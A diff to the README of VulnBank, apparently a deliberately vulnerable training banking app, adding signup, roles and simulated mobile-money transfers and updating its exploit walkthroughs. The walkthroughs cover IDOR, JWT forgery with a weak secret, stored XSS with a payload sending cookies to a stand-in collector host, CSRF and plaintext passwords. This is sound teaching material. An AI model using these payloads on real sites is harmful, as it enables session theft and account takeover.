@@ -9,6 +9,8 @@ point it at real financial data.**
 
 ## 1. Setup
 
+Use Node.js 20.17 or newer (Node.js 24 is used by the Ubuntu lab deployment).
+
 ```powershell
 cd vuln-bank
 npm install
@@ -23,11 +25,75 @@ no currency conversion is performed.
 
 ### Demo accounts
 
-| Username | Password              | Account ID | Role  |
-|----------|------------------------|:---:|-------|
-| alice    | alicepass123           | 1   | user  |
-| bob      | bobpass123              | 2   | user  |
-| admin    | admin                   | 3   | admin |
+| Username | Password     | Account ID | Role  | Demo phone    | Demo PIN |
+|----------|--------------|:----------:|-------|---------------|:--------:|
+| alice    | alicepass123 | 1          | user  | +237600000001 | 1234     |
+| bob      | bobpass123   | 2          | user  | +237600000002 | 1234     |
+| admin    | admin        | 3          | admin | +237600000003 | 1234     |
+
+These are fictional lab contacts and PINs. No phone number is contacted.
+
+### Signup and roles
+
+- Open **Create a demo account** on the sign-in screen.
+- Register a demo name, username, international phone number, password, and
+  four-digit **VulnBank demo PIN**. Never enter a real banking or operator PIN.
+- New accounts receive **5,000 simulated FCFA**, start as regular users, and are
+  signed in automatically. Existing accounts are not given additional funds.
+- Users have the dashboard, account profile, mobile transfers, and lab tools.
+  Administrators additionally have the customer-management panel.
+- In **Admin**, change another user's role and select **Save role**. That user
+  must sign in again to refresh their token's role. Administrators cannot change
+  their own role through this panel.
+
+**This is role-aware lab behavior, not hardened authorization.** Admin checks still
+trust the deliberately weak JWT claims, and the existing token-forgery bypasses
+remain available.
+
+### MTN MoMo and Orange Money simulations
+
+1. Open **Transfer Money**, or select a network on the dashboard.
+2. Choose **MTN MoMo** or **Orange Money**.
+3. Enter any international-format demo recipient number, such as
+   `+237690123456`. Spaces and dashes are accepted; the recipient need not be
+   registered in VulnBank.
+4. Enter a positive FCFA amount with at most two decimal places, an optional
+   note, and your four-digit demo PIN.
+5. Submit to receive an on-screen amount-transferred confirmation and a saved
+   receipt containing the provider, recipient, amount, reference, and UTC date.
+
+These are **external-wallet simulations**: the sender's bank balance is debited
+and the payment is recorded, but no real funds, provider API calls, or SMS messages
+are sent. Even if the phone belongs to a registered contact, this flow does not
+credit that contact's VulnBank account. There is no simulated transfer fee.
+
+The new mobile-payment flow checks the demo PIN and available funds, and commits
+the debit and payment records together. It does **not** fix the original
+`POST /api/transfer`: that endpoint and the **Legacy account-ID transfer lab**
+section still allow the original PIN-free, negative-amount and CSRF exercises.
+Account lookup, raw notes, transaction search, and the original lab tools remain.
+
+### Existing databases and tests
+
+Startup waits for an automatic, transactional migration before serving requests.
+It adds phone/PIN fields and a separate mobile-payment ledger without resetting
+existing balances, credentials, roles, comments, or transaction history. Missing
+seed-account phone details and existing users' initial demo PINs are populated as
+shown above. The legacy transactions table keeps its original six columns so the
+documented UNION-based exercise remains compatible.
+
+Back up the deployed SQLite database before upgrading. **Do not overwrite or
+delete `bank.db` when deploying new application files.** `BANK_DB_PATH` can select
+a separate SQLite file for an isolated instance; otherwise the app uses the
+database beside `database.js`.
+
+```powershell
+npm test
+```
+
+Tests use temporary SQLite files and loopback-only HTTP servers. They cover
+signup, roles, both payment networks, failed and concurrent payments, migration
+preservation, and retained vulnerabilities without changing the working database.
 
 ---
 
@@ -77,7 +143,7 @@ Each section: **what/where** → **step-by-step bypass** → **why it works** �
 
 **Steps:**
 1. Log in as alice (account id 1).
-2. Go to **Account / Comments** page.
+2. Go to **My Account** and expand **Inspect another account (IDOR lab)**.
 3. Change "Account ID" field to `3` (admin) or `2` (bob) and click **Load**.
 4. You now see the admin's full name and full balance — no ownership check was performed.
 
@@ -141,7 +207,7 @@ console.log(jwt.sign({ id: 1, username: 'alice', is_admin: true }, 'bank123', { 
    ```html
    <img src=x onerror="alert(document.cookie)">
    ```
-3. Click **Post Comment** → the alert fires immediately for you, and will fire for **any other user/admin** who later views that account's comments — because the cookie is not `httpOnly`, this payload can exfiltrate session tokens, e.g.:
+3. Click **Post** → the alert fires immediately for you, and will fire for **any other user/admin** who later views that account's comments — because the cookie is not `httpOnly`, this payload can exfiltrate session tokens, e.g.:
    ```html
    <img src=x onerror="fetch('https://your-collector.example/steal?c='+document.cookie)">
    ```
@@ -170,7 +236,7 @@ console.log(jwt.sign({ id: 1, username: 'alice', is_admin: true }, 'bank123', { 
 ---
 
 ### 2.8 Cross-Site Request Forgery (CSRF)
-**Where:** `POST /api/transfer` (Transfer page) — no CSRF token, cookie-only auth, cookie not `SameSite`-restricted.
+**Where:** `POST /api/transfer` (Transfer page → **Legacy account-ID transfer lab**) — no CSRF token, cookie-only auth, cookie not `SameSite`-restricted.
 
 **Steps (simulate an attacker's malicious page):**
 1. Log in to VulnBank as alice in your browser (keep the tab/session open).
@@ -226,13 +292,15 @@ console.log(jwt.sign({ id: 1, username: 'alice', is_admin: true }, 'bank123', { 
 ---
 
 ### 2.11 Plaintext Password Storage & Sensitive Data Exposure
-**Where:** [db.js](C:/Users/rayan/Desktop/vulnorable/vuln-bank/db.js) (seed data) and `GET /api/admin/users`.
+**Where:** [database.js](database.js) (seed data and schema), `POST /api/signup`, and `GET /api/admin/users`.
 
 **Steps:**
 1. Gain admin access (§2.3 or §2.4/§2.5).
 2. Visit **Admin** page → **Load Users** → every user's password is shown **in plaintext** in the table.
 
-**Why:** Passwords are stored and compared as plaintext strings; there is no hashing (e.g. bcrypt/argon2) anywhere in the app.
+**Why:** Passwords and demo transaction PINs are stored and compared as plaintext
+strings; there is no hashing (e.g. bcrypt/argon2) anywhere in the app. The admin API
+continues to expose passwords, but does not add PINs to its response.
 
 **Fix:** Hash passwords with bcrypt/argon2 + per-user salt at signup; never return password fields from any API.
 
